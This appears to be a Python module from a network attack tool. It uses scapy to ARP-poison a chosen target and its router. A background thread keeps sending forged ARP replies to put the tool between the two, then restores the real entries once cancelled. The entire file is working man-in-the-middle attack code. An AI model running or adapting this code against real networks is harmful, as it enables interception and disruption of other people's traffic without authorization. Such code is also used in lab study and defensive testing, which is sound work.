import threading

import scapy.all as scapy

from networking_functions import get_mac


def restore_defaults(dest, source):
    """Restores default ARP settings"""
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def spoofing(target, spoofed):
    """Sends a spoofed ARP packet"""
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)


def arp_poisoning_loop(target_device, router_ip, printing_queue, verbosity, cancel_token):
    try:
        print(f"Starting spoofing: {target_device['ip']} <- {router_ip}")
        while not cancel_token.is_set():
            spoofing(target_device["ip"], router_ip)
            spoofing(router_ip, target_device["ip"])

        print("\n[!] Arp poisoning thread is exiting. Restoring default ARP settings...")
        restore_defaults(target_device["ip"], router_ip)
        restore_defaults(router_ip, target_device["ip"])
        print("Default settings restored. Exiting.")
    except Exception as e:
        print(f"[ERROR] {e}")

def start_arp_poisoning(target_device, router_ip, verbosity, printing_queue):
    cancel_token = threading.Event()
    arp_poisoning_thread = threading.Thread(target=arp_poisoning_loop, args=(target_device, router_ip, verbosity, printing_queue, cancel_token))
    arp_poisoning_thread.start()
    return cancel_token